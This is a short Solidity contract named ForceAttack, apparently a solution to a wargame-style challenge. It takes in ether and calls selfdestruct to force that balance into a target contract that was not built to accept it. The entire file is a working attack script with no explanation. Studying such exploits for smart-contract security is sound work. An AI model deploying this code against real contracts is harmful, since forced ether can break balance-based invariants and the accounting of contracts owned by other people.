//SPDX-License-Identifier: Unlicense
pragma solidity ^0.7.0;

contract ForceAttack {
    address payable public target;

    constructor(address _target) {
        target = payable(_target);
    }

    receive() external payable {
    }

    function attack() public returns (bool) {
        selfdestruct(target);
        return true;
    }

}